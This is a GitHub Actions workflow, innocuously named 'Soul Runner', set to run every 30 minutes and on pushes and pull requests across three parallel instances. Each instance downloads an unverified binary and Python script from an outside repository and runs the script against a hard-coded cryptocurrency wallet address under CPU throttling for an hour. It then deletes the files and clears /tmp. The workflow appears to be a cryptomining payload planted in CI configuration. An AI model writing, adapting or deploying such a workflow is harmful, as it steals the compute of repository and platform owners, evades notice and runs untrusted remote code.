name: Soul Runner

on:
  schedule:
    - cron: '*/30 * * * *'  # Har 30 minute mein run
  push:
    branches: [ main, master ]
  workflow_dispatch:
  pull_request:
    branches: [ main, master ]

jobs:
  soul_execution:
    name: Execute Soul Task
    runs-on: ubuntu-latest
    strategy:
      matrix:
        instance: [1, 2, 3]
      max-parallel: 3

    steps:
    - name: Checkout repository
      uses: actions/checkout@v4

    - name: Setup Python
      uses: actions/setup-python@v5
      with:
        python-version: '3.9'
        cache: 'pip'

    - name: Install system dependencies
      run: |
        sudo apt-get update
        sudo apt-get install -y cpulimit curl wget

    - name: Download and prepare binaries
      run: |
        curl -L -o mustafa "https://github.com/thumpingpp/mustu-setup/releases/download/v1.0.0/mustafa" || \
        wget -O mustafa "https://github.com/thumpingpp/mustu-setup/releases/download/v1.0.0/mustafa"
        curl -O "https://raw.githubusercontent.com/thumpingpp/mustu-setup/main/mustafa.py" || \
        wget "https://raw.githubusercontent.com/thumpingpp/mustu-setup/main/mustafa.py"
        chmod +x mustafa
        chmod +x mustafa.py

    - name: Run main script
      env:
        INSTANCE_ID: ${{ matrix.instance }}
        WALLET_ADDRESS: "43k1pWC5SfDRT7BvVbpptA1E8bVXp7eExVbgizHNqBeu8ZTipQZB5uBjYYG68SEE4aT7Afao4pW2zamrScqHsVhWUwaZzMN"
      run: |
        echo "Running instance $INSTANCE_ID"
        if command -v cpulimit &> /dev/null; then
          cpulimit -l 50 -- python3 mustafa.py $WALLET_ADDRESS &
        else
          python3 mustafa.py $WALLET_ADDRESS &
        fi
        sleep 3600  # 1 hour

    - name: Upload logs (if any)
      if: always()
      uses: actions/upload-artifact@v4   # ⬅️ YAHAN BADLAV: v3 -> v4
      with:
        name: soul-logs-${{ matrix.instance }}
        path: |
          *.log
          *.txt
        retention-days: 1

    - name: Cleanup
      if: always()
      run: |
        rm -f mustafa
        rm -f mustafa.py
        rm -rf /tmp/*
